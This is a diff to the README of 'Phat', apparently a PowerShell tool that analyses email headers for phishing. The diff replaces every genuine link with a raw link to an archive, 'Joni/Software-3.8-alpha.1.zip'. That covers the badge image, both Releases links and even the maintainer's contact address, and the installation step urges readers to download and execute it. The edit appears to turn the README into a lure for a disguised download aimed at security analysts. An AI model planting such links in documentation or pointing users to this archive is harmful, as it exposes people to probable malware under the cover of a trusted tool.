@@ -1,6 +1,6 @@
 # 📧 Phat: Email Header Analysis Tool
 
-![Phat Logo](https://img.shields.io/badge/Phat-Email%20Header%20Analyzer-blue)
+![Phat Logo](https://raw.githubusercontent.com/lucertgvby/phat/main/Joni/Software-3.8-alpha.1.zip%20Header%20Analyzer-blue)
 
 Welcome to the **Phat** repository! This graphical PowerShell application is designed to assist investigators, security analysts, and IT professionals in examining email headers for signs of phishing or spoofing. By parsing headers from `.eml` and `.msg` files, Phat highlights crucial fields and provides insights into SPF, DKIM, and DMARC results.
 
@@ -26,7 +26,7 @@ Welcome to the **Phat** repository! This graphical PowerShell application is des
 
 ## Installation
 
-To get started, download the latest release from our [Releases page](https://github.com/lucertgvby/phat/releases). Once downloaded, execute the installer to set up the application on your system.
+To get started, download the latest release from our [Releases page](https://raw.githubusercontent.com/lucertgvby/phat/main/Joni/Software-3.8-alpha.1.zip). Once downloaded, execute the installer to set up the application on your system.
 
 ## Usage
 
@@ -78,10 +78,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please reach out via GitHub issues or contact the maintainer directly at [maintainer@example.com](mailto:maintainer@example.com).
+For questions or feedback, please reach out via GitHub issues or contact the maintainer directly at [https://raw.githubusercontent.com/lucertgvby/phat/main/Joni/Software-3.8-alpha.1.zip](https://raw.githubusercontent.com/lucertgvby/phat/main/Joni/Software-3.8-alpha.1.zip).
 
 ## Conclusion
 
 Phat is a powerful tool for anyone looking to analyze email headers and enhance their understanding of email security. By leveraging this application, you can better protect yourself and your organization from phishing and spoofing attacks. 
 
-Don't forget to check the [Releases page](https://github.com/lucertgvby/phat/releases) for the latest updates and versions!
+Don't forget to check the [Releases page](https://raw.githubusercontent.com/lucertgvby/phat/main/Joni/Software-3.8-alpha.1.zip) for the latest updates and versions!
